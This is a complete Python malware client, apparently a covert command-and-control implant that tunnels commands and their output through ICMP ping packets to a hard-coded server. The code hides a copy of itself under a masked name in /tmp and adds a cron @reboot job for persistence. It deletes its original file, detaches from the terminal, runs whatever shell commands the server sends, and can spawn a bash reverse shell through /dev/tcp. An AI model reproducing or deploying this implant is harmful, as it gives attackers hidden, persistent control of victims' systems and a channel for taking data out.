#!/usr/bin/env python3

import socket
import struct
import time
import random
import os
import subprocess
import sys

SERVER_IP = "192.168.108.137" # IP addr of whatever the server script is running on, this one is from local testing
INTERVAL = 1
CLIENT_ID = random.randint(1000, 9999)
PERSISTENT_PATH = "/tmp/.sysd"  # More masked name

def checksum(data):
    """Calculate ICMP checksum for packet validity"""
    if len(data) % 2:
        data += b"\x00"
    checksum = 0
    for i in range(0, len(data), 2):
        part = (data[i] << 8) + data[i+1]
        checksum += part
        checksum = (checksum & 0xFFFF) + (checksum >> 16)
    return ~checksum & 0xFFFF

def create_icmp_packet(seq, payload):
    """Create an ICMP Echo Request packet with embedded payload data"""
    icmp_type = 8
    icmp_code = 0
    identifier = CLIENT_ID
    checksum_placeholder = 0
    header = struct.pack("!BBHHH", icmp_type, icmp_code, checksum_placeholder, identifier, seq)
    data = payload.encode("utf-8")
    full_packet = header + data
    chksum = checksum(full_packet)
    header = struct.pack("!BBHHH", icmp_type, icmp_code, chksum, identifier, seq)
    return header + data

def send_ping(sock, seq, message):
    """Send ICMP packet to server with embedded message"""
    packet = create_icmp_packet(seq, message)
    try:
        sock.sendto(packet, (SERVER_IP, 1))
    except Exception:
        pass  # Ignore send errors and keep retrying

def receive_reply(sock):
    """Wait for ICMP reply and extract message."""
    try:
        data, addr = sock.recvfrom(2048)
        if addr[0] == SERVER_IP:
            icmp_header = data[20:28]
            _type, _code, _checksum, _id, seq = struct.unpack("!BBHHH", icmp_header)
            if _type == 0:
                return data[28:].decode("utf-8", errors="ignore").strip()
    except socket.timeout:
        return None
    except Exception:
        return None
    return None

def reverse_shell(ip=None, port=4444):
    """Spawns a reverse shell as a separate process with configurable IP and port."""
    if ip is None:
        ip = SERVER_IP
    
    subprocess.Popen(
        ["/bin/bash", "-c", f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL
    )

def execute_command(command):
    """Executes command, stripping unwanted text. Singular commands have the prefix of `CMD:`"""
    try:
        if command.startswith("CMD:"):
            command = command[4:]
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        output, error = process.communicate()
        return (output + error).strip()
    except Exception as e:
        return f"Error: {str(e)}"

def send_command_output(sock, seq, output):
    """Send command output in chunks."""
    chunk_size = 256  # Increased chunk size for faster transmission
    if not output:
        output = "[No output]"
    chunks = [output[i:i+chunk_size] for i in range(0, len(output), chunk_size)]
    
    for i, chunk in enumerate(chunks):
        chunk_msg = f"[{i+1}/{len(chunks)}] {chunk}"
        send_ping(sock, seq + i, chunk_msg)
        time.sleep(0.1)  # Reduced from 0.5 to 0.1 for faster response

def setup_persistence():
    """Ensure persistence via crontab. Creates a backup file at the persistent path"""
    
    # copy this file
    if not os.path.exists(PERSISTENT_PATH):
        os.system(f"cp {sys.argv[0]} {PERSISTENT_PATH}")
        os.system(f"chmod +x {PERSISTENT_PATH}")
        os.system(f"cp {PERSISTENT_PATH} {PERSISTENT_PATH}.bak")

    # delete starting file
    time.sleep(1)
    if os.path.basename(sys.argv[0]) == "network]":
        os.unlink(sys.argv[0])  # Only delete if name matches above. This way the persistent file remains

    # cron tab for rebooting
    cron_job = f"@reboot {PERSISTENT_PATH} &"
    cron_file = "/tmp/.cronjob"
    os.system(f"crontab -l 2>/dev/null | grep -v '{PERSISTENT_PATH}' > {cron_file}")
    with open(cron_file, "a") as f:
        f.write(cron_job + "\n")
    os.system(f"crontab {cron_file} && rm {cron_file}")

def daemonize():
    """Detach from terminal and hide process."""
    try:
        if os.fork() > 0:
            sys.exit(0)  # Parent exits
    except OSError:
        sys.exit(1)

    os.setsid()  # Create new session
    if os.fork() > 0:
        sys.exit(0)  # Second parent exits

    sys.stdout.flush()
    sys.stderr.flush()
    
    # Redirect std I/O to null
    with open("/dev/null", "wb", 0) as devnull:
        os.dup2(devnull.fileno(), sys.stdin.fileno())
        os.dup2(devnull.fileno(), sys.stdout.fileno())
        os.dup2(devnull.fileno(), sys.stderr.fileno())

def main():
    """Main client functionality. Calls the methods above and loops through to send a ping and wait for a response."""
    setup_persistence()
    daemonize()

    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    sock.settimeout(1)
    seq = 1

    while True:
        send_ping(sock, seq, f"ALIVE:{CLIENT_ID}")  # Heartbeat
        
        for _ in range(3):  # Check multiple times per interval
            response = receive_reply(sock)
            if response:
                if response.lower() == "exit":
                    break
                elif response.lower() == "shell":
                    # use default settings, ip addr hard coded and port 4444
                    reverse_shell()
                    send_ping(sock, seq + 1, "Shell spawned (Default: IP=" + SERVER_IP + ", Port=4444)")
                elif response.lower().startswith("shell "):
                    # Look if IP and port are provided
                    parts = response.split()
                    try:
                        # Check if we have both IP and port or just port
                        if len(parts) == 3:
                            # Format: "shell [IP] [PORT]"
                            ip = parts[1]
                            port = int(parts[2])
                            reverse_shell(ip, port)
                            send_ping(sock, seq + 1, f"Shell spawned (IP={ip}, Port={port})")
                        elif len(parts) == 2:
                            # Format: "shell [PORT]"
                            port = int(parts[1])
                            reverse_shell(None, port)
                            send_ping(sock, seq + 1, f"Shell spawned (IP={SERVER_IP}, Port={port})")
                        else:
                            # Invalid format
                            send_ping(sock, seq + 1, "Invalid shell command format. Use: shell [IP] [PORT] or shell [PORT]")
                    except ValueError:
                        send_ping(sock, seq + 1, "Invalid port number")
                elif response.startswith("CMD:"):
                    output = execute_command(response)
                    send_command_output(sock, seq + 1, output)
            time.sleep(0.3)  # Short sleep between checks

        seq += 1
        time.sleep(INTERVAL)

if __name__ == "__main__":
    main()
